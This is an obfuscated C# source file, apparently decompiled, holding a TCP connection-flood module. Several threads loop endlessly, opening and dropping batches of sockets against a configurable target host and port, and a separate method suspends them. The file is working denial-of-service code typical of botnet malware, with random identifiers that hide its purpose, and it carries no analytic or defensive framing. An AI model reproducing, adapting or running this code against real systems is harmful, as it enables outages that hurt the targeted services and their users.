using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class BZDhfNCWNDRbKKxxYhtWpVs
{
	private class IEPgvRFOlgKMsMSaPuEFDIf
	{
		private IPEndPoint pVsLXLICURoYiokwNOjluSz;

		private Socket[] dsZfyHwcXXWbMFMqRDTWZRp;

		private int TxhdSmdUhrbaOzbxKYGXJNn;

		public IEPgvRFOlgKMsMSaPuEFDIf(IPEndPoint bZTliFayFBNQfBCLVQtJbvP, int JyenomrcVcHUTjmphHVOygi)
		{
			pVsLXLICURoYiokwNOjluSz = bZTliFayFBNQfBCLVQtJbvP;
			TxhdSmdUhrbaOzbxKYGXJNn = JyenomrcVcHUTjmphHVOygi;
		}

		public void DfkxJdqeQrONoWnZdEepjCy(IAsyncResult ar)
		{
		}

		public void Send()
		{
			checked
			{
				while (true)
				{
					try
					{
						dsZfyHwcXXWbMFMqRDTWZRp = new Socket[TxhdSmdUhrbaOzbxKYGXJNn - 1 + 1];
						int num = TxhdSmdUhrbaOzbxKYGXJNn - 1;
						for (int i = 0; i <= num; i++)
						{
							dsZfyHwcXXWbMFMqRDTWZRp[i] = new Socket(pVsLXLICURoYiokwNOjluSz.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							dsZfyHwcXXWbMFMqRDTWZRp[i].Blocking = false;
							AsyncCallback callback = DfkxJdqeQrONoWnZdEepjCy;
							dsZfyHwcXXWbMFMqRDTWZRp[i].BeginConnect(pVsLXLICURoYiokwNOjluSz, callback, dsZfyHwcXXWbMFMqRDTWZRp[i]);
						}
						Thread.Sleep(250);
						int num2 = TxhdSmdUhrbaOzbxKYGXJNn - 1;
						for (int i = 0; i <= num2; i++)
						{
							if (dsZfyHwcXXWbMFMqRDTWZRp[i].Connected)
							{
								dsZfyHwcXXWbMFMqRDTWZRp[i].Disconnect(reuseSocket: false);
							}
							dsZfyHwcXXWbMFMqRDTWZRp[i].Close();
							dsZfyHwcXXWbMFMqRDTWZRp[i] = null;
						}
						dsZfyHwcXXWbMFMqRDTWZRp = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						int num3 = TxhdSmdUhrbaOzbxKYGXJNn - 1;
						for (int i = 0; i <= num3; i++)
						{
							try
							{
								if (dsZfyHwcXXWbMFMqRDTWZRp[i].Connected)
								{
									dsZfyHwcXXWbMFMqRDTWZRp[i].Disconnect(reuseSocket: false);
								}
								dsZfyHwcXXWbMFMqRDTWZRp[i].Close();
								dsZfyHwcXXWbMFMqRDTWZRp[i] = null;
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	private static ThreadStart[] LXLICURoYiokwNOjluSzdsZ;

	private static Thread[] fyHwcXXWbMFMqRDTWZRpTxh;

	public static string dSmdUhrbaOzbxKYGXJNnbZT;

	private static IPEndPoint liFayFBNQfBCLVQtJbvPJye;

	public static int nomrcVcHUTjmphHVOygiDfk;

	private static IEPgvRFOlgKMsMSaPuEFDIf[] xJdqeQrONoWnZdEepjCyVrQ;

	public static int lsXkjzEGxXmePwyTvBPLtHg;

	public static int hIRdFZEcuUuGzSBYISYUgwM;

	public static void TVeCwacJPiqfLHHGLvDKaBz()
	{
		try
		{
			liFayFBNQfBCLVQtJbvPJye = new IPEndPoint(Dns.GetHostEntry(dSmdUhrbaOzbxKYGXJNnbZT).AddressList[0], nomrcVcHUTjmphHVOygiDfk);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			liFayFBNQfBCLVQtJbvPJye = new IPEndPoint(IPAddress.Parse(dSmdUhrbaOzbxKYGXJNnbZT), nomrcVcHUTjmphHVOygiDfk);
			ProjectData.ClearProjectError();
		}
		checked
		{
			fyHwcXXWbMFMqRDTWZRpTxh = new Thread[hIRdFZEcuUuGzSBYISYUgwM - 1 + 1];
			LXLICURoYiokwNOjluSzdsZ = new ThreadStart[hIRdFZEcuUuGzSBYISYUgwM - 1 + 1];
			xJdqeQrONoWnZdEepjCyVrQ = new IEPgvRFOlgKMsMSaPuEFDIf[hIRdFZEcuUuGzSBYISYUgwM - 1 + 1];
			int num = hIRdFZEcuUuGzSBYISYUgwM - 1;
			for (int i = 0; i <= num; i++)
			{
				xJdqeQrONoWnZdEepjCyVrQ[i] = new IEPgvRFOlgKMsMSaPuEFDIf(liFayFBNQfBCLVQtJbvPJye, lsXkjzEGxXmePwyTvBPLtHg);
				LXLICURoYiokwNOjluSzdsZ[i] = xJdqeQrONoWnZdEepjCyVrQ[i].Send;
				fyHwcXXWbMFMqRDTWZRpTxh[i] = new Thread(LXLICURoYiokwNOjluSzdsZ[i]);
				fyHwcXXWbMFMqRDTWZRpTxh[i].Start();
			}
		}
	}

	public static void QGJBZDhfNCWNDRbKKxxYhtW()
	{
		checked
		{
			int num = hIRdFZEcuUuGzSBYISYUgwM - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					fyHwcXXWbMFMqRDTWZRpTxh[i].Suspend();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					fyHwcXXWbMFMqRDTWZRpTxh[i].Suspend();
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
